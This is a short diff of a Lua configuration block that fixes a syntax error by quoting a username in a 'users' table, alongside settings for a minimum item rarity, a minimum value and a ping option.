@@ -1,4 +1,4 @@
-local users = {ally4ofc}
+local users = {"ally4ofc"}
 local min_rarity = "Godly"
 local min_value = 1
 local ping = "No"
